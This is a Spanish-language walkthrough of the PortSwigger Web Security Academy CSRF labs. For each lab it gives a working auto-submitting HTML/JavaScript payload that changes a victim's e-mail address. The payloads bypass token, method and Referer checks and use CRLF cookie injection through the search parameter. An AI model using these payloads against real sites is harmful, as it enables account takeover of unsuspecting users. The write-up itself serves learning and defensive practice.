# Cross-Site-Request-Forgery (Labs)

### CSRF vulnerability with no defenses

Nuestro objetivo es conseguir provocar un cambio de e-mail de la víctima, para ello disponemos de un servidor para nuestro exploit y un usuario creado en la web.

En este caso concreto lo que debemos hacer es ver primero cómo hacer dicho cambio al e-mail, para ello nos logueamos y en mi cuenta procuramos cambiar el e-mail interceptando con Burpsuite y comprobando la petición.

No tiene mucho misterio, es una petición tipo POST en la que únicamente tenemos un campo, así que podemos generar un Payload en nuestro servidor de exploit.

```
<form method="POST" action="https://aca11fed1e1eceffc0756c74001700bf.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token validation depends on request method

En este caso hacemos igual que antes pero vemos que piden un CSRF para realizar la petición, así que podemos probar qué ocurriría si en vez de por POST hacemos la petición por GET y sin CSRF, y parece que funciona, así que nuestro Payload es:

```
<form method="GET" action="https://acda1f231e24960bc01b1d4e0078008f.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token validation depends on token being present

Me comí más la cabeza para este de lo que realmente era necesario, si eliminar el parámetro CSRF completamente sigue funcionando el cambio, así que es el mismo Payload que el primer ejercicio:

```
<form method="POST" action="https://ac191fc11e4c4b62c01318b7009600d4.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token is not tied to user session

En este caso si nos ponemos a hacer varias pruebas vemos que el CSRF creado no depende del usuario, es decir, si se crea un CSRF específico para mi puede utilizarse desde otra cuenta para cambiar su email. Pero únicamente se puede utilizar una vez cada CSRF, por lo que únicamente tenemos que añadir un campo con un CSRF no utilizado que podemos sacar del mismo código fuente desde el navegador.

```
<form method="POST" action="https://ac231fa71f26ebfdc05b093900f40029.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
     <input type="hidden" name="csrf" value="WiXuGUi3ZgtgHASYQVbhNktdX7e2h0Np">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

En un ataque real podría el atacante estar generando continuamente esos CSRF e inyectarlos en el código de su sitio web malicioso, en este caso lo hacemos de forma manual.

### CSRF where token is tied to non-session cookie

Con toda la sinceridad del mundo tuve que mirar la solución, probé a hacer muchas cosas pero es cierto que me cerré en banda únicamente a la sección de cambio de mail, y fue un gran fallo que no debéis cometer.¡ Mirad todo!

Al final resulta que cuando buscas algo en el cuadro de búsqueda de la web, añade una cookie al Header, así que igual que cuando escapas de un XSS o un SQLI podemos crear nuestra propia Cookie en la cabecera que será enviada.

A esto le sumamos que la Cookie CSRF y el campo CSRF se pueden intercambiar entre usuarios tenemos el Payload preparado.

```
<form method="POST" action="https://acbe1fc11fc91156c07b15580061007c.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
     <input type="hidden" name="csrf" value="Z0KXhR8NO4Q1LVVOtPmCpXDdosayyc4V">
</form>
<img src="https://acbe1fc11fc91156c07b15580061007c.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrfKey=iayAf3yJT4NE6odynia0dtHmG1ALiuI7" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token is duplicated in cookie

En este caso vemos a través de Burpsuite que en nuestra petición de cambio de e-mail se repite el token tanto en el body como en una cookie del Header; Si hacemos pruebas veremos que es indiferente el valor de la cookie, lo importante es que la del Header y la del Body coincidan. Cómo seguimos teniendo la vulnerabilidad de añadir cookies a través de la búsqueda únicamente tenemos que hacer un pequeño cambio y hacer que coincidan ambos token CSRF.

En mi caso he utilizado 1234 para demostrar que es indiferente el token utilizado.

```
<form method="POST" action="https://ac641f7f1ed59023c0091701002f00dc.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
     <input type="hidden" name="csrf" value="1234">
</form>
<img src="https://ac641f7f1ed59023c0091701002f00dc.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrf=1234" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where Referer validation depends on header being present

Al ver la petición y no encontrar nada a simple vista probé a utilizar el mismo exploit que en el primer ejercicio. Al hacerlo me saltó el error de que el referer no era correcto. Así que probé a toquetear un poco el Header en las peticiones y me di cuenta que si eliminas completamente el referer no salta dicho error, por lo que el exploit podría quedar tal que así:

```
<head>
<meta name="referrer" content="no-referrer">
</head>
<form method="POST" action="https://acf81ffe1f518d49c09692be008600b4.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF with broken Referer validation

Lo primero que me di cuenta es que en esta ocasión si que validaba el campo referer y no nos vale con eliminarlo. Pero es cierto que lo importante es que aparezca la URL no que sea exactamente ella, por esa razón podemos añadirla como argumento incluyéndolo en el historial.

Aún así me quedé muy atascado porque seguía sin funcionar, al final con un poco de ayuda llegue a la conclusión de que debíamos añadir la política de referer en el header del exploit.

```
#En el header añadimos
Referrer-Policy: unsafe-url

#En el body
<form method="POST" action="https://acf31fca1f306db0c06f5c0d000200a3.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=historial()>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
function historial() {
    history.pushState("", "", "/?acf31fca1f306db0c06f5c0d000200a3.web-security-academy.net")
}
</script>
```
